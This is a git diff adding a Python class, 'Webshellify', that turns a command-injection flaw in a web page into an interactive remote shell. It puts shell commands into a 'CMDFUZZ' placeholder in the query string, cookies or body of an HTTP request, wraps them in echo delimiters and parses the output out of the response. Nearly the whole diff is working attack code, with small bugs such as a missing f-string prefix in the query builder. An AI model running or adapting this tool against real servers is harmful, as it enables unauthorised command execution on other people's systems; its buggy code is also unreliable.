@@ -4,18 +4,121 @@ experience.
 
 The necessary request information should be specified or any functions that
 fetch necessary values from the server may be passed in as well.
+
+The location to specify where the command would be is specified by adding the
+string "CMDFUZZ" in either the request body or request query. This fuzzing string
+can be altered if necessary.
 """
+import re
+import requests as req
+import urllib.parse
 
 class Webshellify:
-    def init(self, host, path):
+    content_types = [
+        "text/plain",
+        "application/x-www-form-urlencoded"
+    ]
+    """
+    Usage:
+    If the vulnerable webpage is at http://localhost/vuln/path, then the correct
+    initialization for a Webshellify instance would be:
+    `wshell = Webshellify("localhost", "/vuln/path", [options])`
+
+    options then include:
+    - debug: (boolean) Enable debugging messages, false by default
+    """
+    def __init__(self, host, path, **args):
         # store necessary information that will improve the webshell
         self.workdir = "/"
         self.parentdir = "/"
+        self.delimiter = "output"
+
+        self.host = host
+        if("://" in self.host): # remove "http://" portion
+            self.host = host.split("://")[-1]
+
+        self.path = path
+        if(self.path[0] == '/'):
+            self.path = path [1:]
+
+        self.debug = False
+        if("debug" in args.keys()):
+            self.debug = args["debug"]
 
         # necessary request information
         self.headers = {
             "User-Agent" : "curl/7.82.0",
             "Accept" : "*/*",
             "Host" : host,
+            "Content-Type": "application/x-www-form-urlencoded",
         }
         self.cookies = {}
+        self.method = "POST"
+
+        self.req_body_form = ""
+        self.queries = {}
+        self.cmd_fuzz = "CMDFUZZ"
+
+    def __gen_command(self, command):
+        return f"echo '`{self.delimiter}`'; {command}; echo '`/{self.delimiter}`'"
+
+    def __extract_output(self, raw):
+        regex_form = f"`{self.delimiter}`\n((.*\n)*)`\/{self.delimiter}`"
+        output_re = re.compile(regex_form)
+        if(self.debug):
+            print(f"""[debug] in funct `__extract_output`
+raw: {raw}
+regex: {regex_form}
+match: {output_re.findall(raw)}""")
+        output = output_re.findall(raw)[0][0]
+        return output
+
+    def send_command(self, command):
+        cmd = self.__gen_command(command)
+        # generate query
+        query_str = "?"
+        for key, value in enumerate(self.queries):
+            if(self.cmd_fuzz in value):
+                value = value.replace(self.cmd_fuzz, cmd)
+            query_str += "{key}={value}&"
+        query_str = query_str[:-1] # remove the last character (either '?' or '&')
+
+        # generate cookies
+        cookie_dict = {}
+        for key, value in self.cookies.items():
+            if(self.cmd_fuzz in value):
+                value = value.replace(self.cmd_fuzz, cmd)
+            cookie_dict[key] = value
+
+        # generate body (if it is neither a GET nor a HEAD request)
+        body_str = ""
+        if(self.method.upper() != "GET" and self.method.upper() != "HEAD"):
+            body_str = self.req_body_form
+            if(self.cmd_fuzz in body_str):
+                body_str = body_str.replace(self.cmd_fuzz, cmd)
+
+        # generate url
+        url = f"http://{self.host}/{self.path}{query_str}"
+
+        # send request with payload
+        resp = req.request(
+                self.method.upper(),
+                url,
+                cookies=cookie_dict,
+                data=body_str,
+                headers=self.headers)
+
+        if(self.debug):
+            print(f"""
+[debug] in funct `__extract_output`
+sent
+----
+method: {self.method.upper()}
+url: {url}
+cookies: {cookie_dict}
+data: {body_str}
+headers: {self.headers}
+"""
+            )
+
+        return self.__extract_output(resp.text)
